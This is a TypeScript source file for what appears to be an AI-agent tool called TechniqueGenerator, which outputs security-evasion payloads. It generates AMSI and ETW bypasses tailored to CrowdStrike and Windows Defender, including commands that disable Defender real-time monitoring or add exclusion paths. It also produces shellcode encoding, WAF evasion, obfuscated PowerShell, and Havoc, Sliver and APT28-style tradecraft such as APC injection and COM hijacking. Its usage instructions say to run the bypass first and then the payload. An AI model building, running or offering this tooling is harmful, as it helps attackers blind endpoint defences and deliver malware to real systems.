          encoding: { type: 'string', enum: ['base64', 'hex', 'xor'], description: 'Encoding method (valid for shellcode_encode)' },
        },
        required: ['technique', 'payload'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor' } = input as unknown as TechniqueGeneratorInput

    let output = ''

    switch (technique) {
      case 'amsi_bypass':
        output = this.generateAMSI(payload, analysis_context?.edr)
        break
      case 'etw_bypass':
        output = this.generateETW(payload, analysis_context?.edr)
        break
      case 'shellcode_encode':
        output = shellcodeEncode(payload, encoding)
        break
      case 'waf_evasion':
        output = wafEvasion(payload, analysis_context?.waf)
        break
      case 'obfuscated_ps':
        output = obfuscatedPS(payload)
        break
      case 'havoc_strategy':
        output = [
          havocOperationalPattern(),
          '',
          havocEvasionCompilerFlags(),
          '',
          indirectSyscallStrategy(),
          '',
          hardwareBypassStrategy(),
          '',
          sleepObfuscationStrategy(),
          '',
          stackSpoofingStrategy(),
          '',
          hashApiResolution(),
        ].join('\n')
        break
      case 'sliver_strategy':
        output = [
          sliverOperationalPattern(),
          '',
          refreshPE(),
          '',
          sgnEncoding(),
          '',
          trafficEncoderPattern(),
          '',
          peDonorSpoofing(),
          '',
          dualModeDotNet(),
          '',
          goTemplateCompilation(),
        ].join('\n')
        break
      case 'refresh_pe':
        output = refreshPE()
        break
      case 'sgn_encoding':
        output = sgnEncoding()
        break
      case 'traffic_encoder':
        output = trafficEncoderPattern()
        break
      case 'pe_donor':
        output = peDonorSpoofing()
        break
      case 'dotnet_dual':
        output = dualModeDotNet()
        break
      case 'go_template':
        output = goTemplateCompilation()
        break
      case 'apt28_strategy':
        output = [
          apt28OperationalPattern(),
          '',
          apt28StringObfuscation(),
          '',
          apt28RotatingXOR(),
          '',
          apt28PNGSteganography(),
          '',
          apt28MemoryPermissionTransition(),
          '',
          apt28APCInjection(),
          '',
          apt28COMHijacking(),
          '',
          apt28DeadDropResolver(),
          '',
          apt28WebDAVUNC(),
        ].join('\n')
        break
      case 'apt28_string_obf':
        output = apt28StringObfuscation()
        break
      case 'apt28_rotating_xor':
        output = apt28RotatingXOR()
        break
      case 'apt28_png_stego':
        output = apt28PNGSteganography()
        break
      case 'apt28_memory_transition':
        output = apt28MemoryPermissionTransition()
        break
      case 'apt28_apc_inject':
        output = apt28APCInjection()
        break
      case 'apt28_com_hijack':
        output = apt28COMHijacking()
        break
      case 'apt28_dead_drop':
        output = apt28DeadDropResolver()
        break
      case 'apt28_webdav_unc':
        output = apt28WebDAVUNC()
        break
      case 'custom':
        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy/sliver_strategy/apt28_strategy)`
        break
      default:
        return { content: `Unknown technique: ${technique}`, isError: true }
    }

    return { content: output, isError: false }
  }

  private generateAMSI(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] AMSI Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('Havoc uses hardware breakpoints (Dr0-Dr3 + VEH) instead of memory patching.')
    lines.push('Memory patching is detectable because EDRs hook NtProtectVirtualMemory.')
    lines.push('Hardware breakpoints are CPU registers — no memory modification at all.')
    lines.push('')
    lines.push('For PowerShell (where hardware breakpoints are not directly accessible),')
    lines.push('use reflection-based bypass as the most practical alternative.')
    lines.push('')

    if (edrType?.includes('CrowdStrike')) {
      lines.push(`## CrowdStrike Falcon Environment`)
      lines.push(`CrowdStrike monitors PowerShell execution closely. Recommended approach:`)
      lines.push('')
      lines.push('# Method 1: Reflection patch (recommended for PS)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Method 2: Execute AMSI bypass first, then payload')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push(`# Then execute original payload:`)
      lines.push(payload)
    } else if (edrType?.includes('Defender')) {
      lines.push(`## Windows Defender Environment`)
      lines.push('')
      lines.push('# Method 1: Add exclusion path (requires admin)')
      lines.push(`  Add-MpPreference -ExclusionPath "C:\\temp"`)
      lines.push('')
      lines.push('# Method 2: Disable real-time monitoring (requires admin)')
      lines.push(`  Set-MpPreference -DisableRealtimeMonitoring $true`)
      lines.push('')
      lines.push('# Method 3: Reflection patch (no admin needed, recommended)')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push('')
      lines.push('# Method 4: String obfuscation (bypasses static detection)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Then execute original payload:')
      lines.push(payload)
    } else {
      // Generic AMSI bypass
      lines.push(`## Generic AMSI Bypass (${edrType || 'unknown EDR'})`)
      lines.push('')

      let idx = 1
      for (const [name, template] of Object.entries(AMSI_BYPASS_TEMPLATES)) {
        lines.push(`### Method ${idx}: ${name}`)
        lines.push(template)
        lines.push('')
        idx++
      }

      lines.push('## Usage')
      lines.push('1. Execute AMSI bypass first (choose one method)')
      lines.push('2. Then execute original payload')
      lines.push('')
      lines.push(`Original payload: ${payload}`)
    }

    return lines.join('\n')
  }

  private generateETW(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] ETW Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('ETW (Event Tracing for Windows) logs PowerShell execution for EDR monitoring.')
    lines.push('Havoc disables ETW via reflection on the PSEtwLogProvider internal fields.')
    lines.push('The alternative — registry method — requires admin but is more persistent.')
    lines.push('')

    lines.push(`## ETW Bypass (${edrType || 'unknown EDR'})`)
    lines.push('ETW is used by EDRs to monitor PowerShell execution. Bypassing ETW')
    lines.push('prevents execution logging. Combine with AMSI bypass for full coverage.')
    lines.push('')

    let idx = 1
    for (const [name, template] of Object.entries(ETW_BYPASS_TEMPLATES)) {
      lines.push(`### Method ${idx}: ${name}`)
      lines.push(template)
      lines.push('')
      idx++
    }

    lines.push('## Usage')
    lines.push('1. Execute ETW bypass first')
    lines.push('2. Then execute original payload (recommend AMSI bypass too)')
    lines.push('')
    lines.push(`Original payload: ${payload}`)

    return lines.join('\n')
  }
}
